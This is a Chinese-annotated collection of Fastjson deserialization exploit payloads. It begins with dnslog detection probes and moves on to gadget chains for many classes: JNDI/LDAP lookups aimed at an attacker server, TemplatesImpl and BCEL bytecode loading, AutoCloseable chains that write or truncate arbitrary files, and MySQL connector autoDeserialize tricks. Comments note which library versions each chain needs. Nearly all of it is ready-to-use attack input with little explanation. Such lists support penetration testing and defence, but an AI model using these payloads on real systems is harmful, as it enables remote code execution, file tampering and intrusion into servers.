#### dnslog探测

```java
{"rand1":{"@type":"java.net.InetAddress","val":"http://dnslog"}}

{"rand2":{"@type":"java.net.Inet4Address","val":"http://dnslog"}}

{"rand3":{"@type":"java.net.Inet6Address","val":"http://dnslog"}}

{"rand4":{"@type":"java.net.InetSocketAddress"{"address":,"val":"http://dnslog"}}}

{"rand5":{"@type":"java.net.URL","val":"http://dnslog"}} //1.2.68失败


一些畸形payload，不过依然可以触发dnslog：
{"rand6":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}//URL换为Inet4Address成功

{"rand7":Set[{"@type":"java.net.Inet4Address","val":"http://dnslog"}]}

{"rand8":Set[{"@type":"java.net.Inet4Address","val":"http://dnslog"}
```

#### payload

```java
JdbcRowSetImpl

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://127.0.0.1:23457/Command8",
    "autoCommit": true
}

TemplatesImpl

{
	"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
	"_bytecodes": ["yv66vgA...k="],
	'_name': 'su18',
	'_tfactory': {},
	"_outputProperties": {},
}
JndiDataSourceFactory

{
    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties": {
      "data_source": "ldap://127.0.0.1:23457/Command8"
    }
}
SimpleJndiBeanFactory

{
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "ldap://127.0.0.1:23457/Command8",
    "propertyPath": "su18",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "ldap://127.0.0.1:23457/Command8"
      ]
    }
}
DefaultBeanFactoryPointcutAdvisor

{
  "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
   "beanFactory": {
     "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
     "shareableResources": [
       "ldap://127.0.0.1:23457/Command8"
     ]
   },
   "adviceBeanName": "ldap://127.0.0.1:23457/Command8"
},
{
   "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
}
WrapperConnectionPoolDataSource

{
    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "userOverridesAsString": "HexAsciiSerializedMap:aced000...6f;"
  }
JndiRefForwardingDataSource

{
    "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
    "jndiName": "ldap://127.0.0.1:23457/Command8",
    "loginTimeout": 0 
  }
InetAddress

{
	"@type": "java.net.InetAddress",
	"val": "http://dnslog.com"
}
Inet6Address

{
	"@type": "java.net.Inet6Address",
	"val": "http://dnslog.com"
}
URL

{
	"@type": "java.net.URL",
	"val": "http://dnslog.com"
}
JSONObject

{
	"@type": "com.alibaba.fastjson.JSONObject",
	{
		"@type": "java.net.URL",
		"val": "http://dnslog.com"
	}
}
""
}
URLReader

{
	"poc": {
		"@type": "java.lang.AutoCloseable",
		"@type": "com.alibaba.fastjson.JSONReader",
		"reader": {
			"@type": "jdk.nashorn.api.scripting.URLReader",
			"url": "http://127.0.0.1:9999"
		}
	}
}
AutoCloseable 任意文件写入

{
	"@type": "java.lang.AutoCloseable",
	"@type": "org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream",
	"out": {
		"@type": "java.io.FileOutputStream",
		"file": "/path/to/target"
	},
	"parameters": {
		"@type": "org.apache.commons.compress.compressors.gzip.GzipParameters",
		"filename": "filecontent"
	}
}
BasicDataSource
//如果使用的是JSON.parseObject()进行反序列化操作，会将其转化为JSONObject对象，是Map类的子类，所以就可以执行所有的getter和setter方法
{
  "@type" : "org.apache.tomcat.dbcp.dbcp.BasicDataSource", //下面的是8.0之后的新版包路径，这里是旧版的
  "driverClassName" : "$$BCEL$$$l$8b$I$A$A$A$A...",
  "driverClassLoader" :
  {
    "@type":"Lcom.sun.org.apache.bcel.internal.util.ClassLoader;"
  }
}
//但是当使用的是JSON.parse()进行反序列化操作的时候就没有JSON.toJSON()的调用，所以需要在外加一个{}在反序列化的时候生成一个JSONObject对象，之后放在key的位置，在反序列化的过程中key会调用toString()方法，就成功触发了getConnection()。
{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",//上面的是旧版包路径
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "x"
}
JndiConverter
//<=1.2.62 需要xbean-reflect包
{
	"@type": "org.apache.xbean.propertyeditor.JndiConverter",
	"AsText": "ldap://127.0.0.1:23457/Command8"
}
JtaTransactionConfig

{
	"@type": "com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
	"properties": {
		"@type": "java.util.Properties",
		"UserTransaction": "ldap://127.0.0.1:23457/Command8"
	}
}
JndiObjectFactory
//<=1.2.66 需要shiro包
{
	"@type": "org.apache.shiro.jndi.JndiObjectFactory",
	"resourceName": "ldap://127.0.0.1:23457/Command8"
}
AnterosDBCPConfig

{
	"@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
	"metricRegistry": "ldap://127.0.0.1:23457/Command8"
}
AnterosDBCPConfig2

{
	"@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
	"healthCheckRegistry": "ldap://127.0.0.1:23457/Command8"
}
CacheJndiTmLookup

{
	"@type": "org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
	"jndiNames": "ldap://127.0.0.1:23457/Command8"
}
AutoCloseable RCE fastjson 1.2.50

{
    "@type":"java.lang.AutoCloseable",
    "@type":"oracle.jdbc.rowset.OracleJDBCRowSet",
    "dataSourceName":"ldap://localhost:1389/test",
    "command":"a"
}

AutoCloseable 清空指定文件

{
    "@type":"java.lang.AutoCloseable",
    "@type":"java.io.FileOutputStream",
    "file":"/tmp/nonexist",
    "append":false
}
AutoCloseable 清空指定文件

{
    "@type":"java.lang.AutoCloseable",
    "@type":"java.io.FileWriter",
    "file":"/tmp/nonexist",
    "append":false
}
AutoCloseable 任意文件写入

{
    "stream":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"java.io.FileOutputStream",
        "file":"/tmp/nonexist",
        "append":false
    },
    "writer":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"org.apache.solr.common.util.FastOutputStream",
        "tempBuffer":"SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=",
        "sink":
        {
            "$ref":"$.stream"
        },
        "start":38
    },
    "close":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"org.iq80.snappy.SnappyOutputStream",
        "out":
        {
            "$ref":"$.writer"
        }
    }
}

{
    'stream':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.apache.tools.ant.util.LazyFileOutputStream',
        'file':'/tmp/nonexist',
        'append':false
    },
    'writer':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.apache.solr.common.util.FastOutputStream',
        'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=',
        'sink':
        {
            '$ref':'$.stream'
        },
        'start':38
    },
    'close':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.iq80.snappy.SnappyOutputStream',
        'out':
        {
            '$ref':'$.writer'
        }
    }
}

{
    '@type':"java.lang.AutoCloseable",
    '@type':'sun.rmi.server.MarshalOutputStream',
    'out':
    {
        '@type':'java.util.zip.InflaterOutputStream',
        'out':
        {
           '@type':'java.io.FileOutputStream',
           'file':'/tmp/fj_hack_jdk11',
           'append':false
        },
        'infl':
        {
            'input':
            {
                'array':'eJzzSK1USMqv1FHwVEjMVQjKT8oPSS3KAABRJwdZ',
                'limit':30
            }
        },
        'bufLen':1048576
    },
    'protocolVersion':1
}
AutoCloseable 依赖文件x

{
    'stream':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.eclipse.core.internal.localstore.SafeFileOutputStream',
        'targetPath':'/tmp/dst',
        'tempPath':'/tmp/src'
    },
    'writer':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'com.esotericsoftware.kryo.io.Output',
        'buffer':'aGFja2VkIGJ5IG0wMWUu',
        'outputStream':
        {
            '$ref':'$.stream'
        },
        'position':15
    },
    'close':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'com.sleepycat.bind.serial.SerialOutput',
        'out':
        {
            '$ref':'$.writer'
        }
    }
}
AutoCloseable MarshalOutputStream 任意文件写入

{
	'@type': "java.lang.AutoCloseable",
	'@type': 'sun.rmi.server.MarshalOutputStream',
	'out': {
		'@type': 'java.util.zip.InflaterOutputStream',
		'out': {
			'@type': 'java.io.FileOutputStream',
			'file': 'dst',
			'append': false
		},
		'infl': {
			'input': {
				'array': 'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',
				'limit': 22
			}
		},
		'bufLen': 1048576
	},
	'protocolVersion': 1
}
AutoCloseable 依赖commons-io 2.0 - 2.6
    
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/tmp/pwned",
        "encoding":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
}
AutoCloseable 依赖commons-io 2.7 - 2.8.0 
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",
        "start":0,
        "end":2147483647
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/tmp/pwned",
        "charsetName":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
//fastjson<=1.2.68 commons-io 2.0-2.6 commons-io ⼤于2.6时改⼏个参数名就⾏了
{
 "x":{
 "@type":"com.alibaba.fastjson.JSONObject",
 "input":{
 "@type":"java.lang.AutoCloseable",
 "@type":"org.apache.commons.io.input.ReaderInputStream",
 "reader":{
 "@type":"jdk.nashorn.api.scripting.URLReader",
 "url":"http://127.0.0.1:8083/test.txt"
 },
 "charsetName":"UTF-8",
 "bufferSize":10000
 },
 "branch":{
 "@type":"java.lang.AutoCloseable",
 "@type":"org.apache.commons.io.output.WriterOutputStream",
 "writer":{
 "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
 "file":"/tmp/files/12345",
 "encoding":"UTF-8",
 "append": true
 },
 "charset":"UTF-8",
 "bufferSize": 8193,
 "writeImmediately": true
 },
 "trigger":{
 "@type":"java.lang.AutoCloseable",
 "@type":"org.apache.commons.io.input.XmlStreamReader",
 "is":{
 "@type":"org.apache.commons.io.input.TeeInputStream",
 "input":{
 "$ref":"$.input"
 },
 "branch":{
 "$ref":"$.branch"
 },
 "closeBranch": true
 },
 "httpContentType":"text/xml",
 "lenient":false,
 "defaultEncoding":"UTF-8"
 }
 }
}
      
Mysqlconnector 5.1.x  {"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"mysql.host","portToConnectTo":3306,"info":{"user":”user","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"dbname","url":""}

Mysqlconnector 6.0.2 or 6.0.3
{"@type": "java.lang.AutoCloseable","@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection","proxy":{"connectionString":{"url": "jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true"}}}

Mysqlconnector 6.x or < 8.0.20
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "masters": [{"host":"mysql.host"}], "slaves":[], "properties":{"host":"mysql.host","user":"user","dbname":"dbname","password":"pass","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"}}}}

{"x":
  {"@type":"java.lang.Exception",
  "@type":"org.openqa.selenium.WebDriverException"},
 "y":{"$ref":"$x.systemInformation"}
}

BasicDataSource

{
		"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
		"driverClassName": "true",
		"driverClassLoader": {
			"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
		},
		"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A"
	}
HikariConfig

{
	"@type": "com.zaxxer.hikari.HikariConfig",
	"metricRegistry": "ldap://127.0.0.1:23457/Command8"
}
HikariConfig

{
	"@type": "com.zaxxer.hikari.HikariConfig",
	"healthCheckRegistry": "ldap://127.0.0.1:23457/Command8"
}
HikariConfig

{
	"@type": "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig",
	"metricRegistry": "ldap://127.0.0.1:23457/Command8"
}
HikariConfig

{
	"@type": "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig",
	"healthCheckRegistry": "ldap://127.0.0.1:23457/Command8"
}
SessionBeanProvider

{
	"@type": "org.apache.commons.proxy.provider.remoting.SessionBeanProvider",
	"jndiName": "ldap://127.0.0.1:23457/Command8",
	"Object": "su18"
}
JMSContentInterceptor

{
	"@type": "org.apache.cocoon.components.slide.impl.JMSContentInterceptor",
	"parameters": {
		"@type": "java.util.Hashtable",
		"java.naming.factory.initial": "com.sun.jndi.rmi.registry.RegistryContextFactory",
		"topic-factory": "ldap://127.0.0.1:23457/Command8"
	},
	"namespace": ""
}
ContextClassLoaderSwitcher

{
	"@type": "org.jboss.util.loading.ContextClassLoaderSwitcher",
	"contextClassLoader": {
		"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
	},
	"a": {
		"@type": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A"
	}
}
OracleManagedConnectionFactory

{
	"@type": "oracle.jdbc.connector.OracleManagedConnectionFactory",
	"xaDataSourceName": "ldap://127.0.0.1:23457/Command8"
}
JNDIConfiguration

{
	"@type": "org.apache.commons.configuration.JNDIConfiguration",
	"prefix": "ldap://127.0.0.1:23457/Command8"
}
JDBC4Connection

{
	"@type": "java.lang.AutoCloseable",
	"@type": "com.mysql.jdbc.JDBC4Connection",
	"hostToConnectTo": "172.20.64.40",
	"portToConnectTo": 3306,
	"url": "jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
	"databaseToConnectTo": "test",
	"info": {
		"@type": "java.util.Properties",
		"PORT": "3306",
		"statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
		"autoDeserialize": "true",
		"user": "yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn",
		"PORT.1": "3306",
		"HOST.1": "172.20.64.40",
		"NUM_HOSTS": "1",
		"HOST": "172.20.64.40",
		"DBNAME": "test"
	}
}
LoadBalancedMySQLConnection

{
	"@type": "java.lang.AutoCloseable",
	"@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
	"proxy": {
		"connectionString": {
			"url": "jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true"
		}
	}
}
ReplicationMySQLConnection

{
	"@type": "java.lang.AutoCloseable",
	"@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
	"proxy": {
		"@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
		"connectionUrl": {
			"@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
			"masters": [{
				"host": "mysql.host"
			}],
			"slaves": [],
			"properties": {
				"host": "mysql.host",
				"user": "user",
				"dbname": "dbname",
				"password": "pass",
				"queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
				"autoDeserialize": "true"
			}
		}
	}
}
UnpooledDataSource

{
	"x": {
		{
			"@type": "com.alibaba.fastjson.JSONObject",
			"name": {
				"@type": "java.lang.Class",
				"val": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource"
			},
			"c": {
				"@type": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource",
				"key": {
					"@type": "java.lang.Class",
					"val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
				},
				"driverClassLoader": {
					"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
				},
				"driver": "$$BCEL$$$l$8b$..."
			}
		}: "a"
	}
}
```

